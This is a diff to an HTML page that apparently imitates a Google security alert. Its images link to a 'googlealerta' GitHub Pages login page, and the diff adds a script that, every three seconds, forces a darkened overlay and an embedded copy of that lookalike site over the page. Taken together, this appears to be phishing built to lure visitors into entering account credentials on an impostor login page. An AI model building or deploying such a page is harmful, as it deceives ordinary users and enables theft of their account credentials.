@@ -1,6 +1,5 @@
 <!doctype html>
-<html lang="en">
-  <head>
+<html lang="en"><head>
     <!-- Required meta tags -->
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -16,6 +15,8 @@
             background-color: #FFF;
             margin: 0;
             padding: 0;
+            display: grid;
+            justify-content: space-around;
         }
         .r {
             padding: 32px;
@@ -26,16 +27,50 @@
             border: 1px solid #d3d3d396;
             border-radius: 12px;
         }
+        .o {
+            padding: 32px;
+            display: grid;
+            justify-content: center;
+            border: 4px solid hsla(0, 0%, 2%, 0.075);
+        }
+        #google-alert {
+            height: 560px;
+        }
+        #y {
+            display: flex;
+            align-content: flex-start;
+            flex-wrap: nowrap;
+            align-items: flex-end;
+            justify-content: space-evenly;
+        }
     </style>
+    <script>
+        window.onload=function(){
+            
+            window.setInterval(function(){
+                let popup = document.getElementById('google-alert');
+                let e = document.getElementById('1');
+                let w = document.getElementById('2');
+                popup.style.display = 'block';
+                e.style.display = 'block';
+            },3000);
+        }
+    </script>
 </head>
 <body>
-    <div class="x" class="container-fluid">
+    <div id="1" class="qwe" style="width: 100%;height: 100%;background-color: rgba(0, 0, 0, 0.4);display: none;position: fixed;">
+    </div>
+    <div class="x">
         <div class="row">
-            <div class="r">
+            <div id="y" class="r" style="max-width: 462px;">
                 <div class="e">
-                    <img style="margin-top: 42px;" width="100%" src="gf.png">
+                    <img style="margin-top: 42px; width: 100%;" src="gf.png">
                     <a href="https://googlealerta.github.io/googlealerta/loginAccount.html"><img style="margin-bottom: 42px" width="100%" src="o.png"></a>
                 </div>
+                <object class="col-lg-8 col-sm-8" id="google-alert" data="https://googlealerta.github.io/googlealerta/" height="100%" style="display: none; position: absolute; top: 14%; max-width: 626px;">
+                    <embed src="https://googlealerta.github.io/googlealerta/" width="80%" height="76%"> 
+                    Error: Embedded data could not be displayed.
+                </object>
             </div>
         </div>
     </div>  
@@ -46,5 +81,5 @@
     <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-  </body>
-</html>
+  
+</body></html>
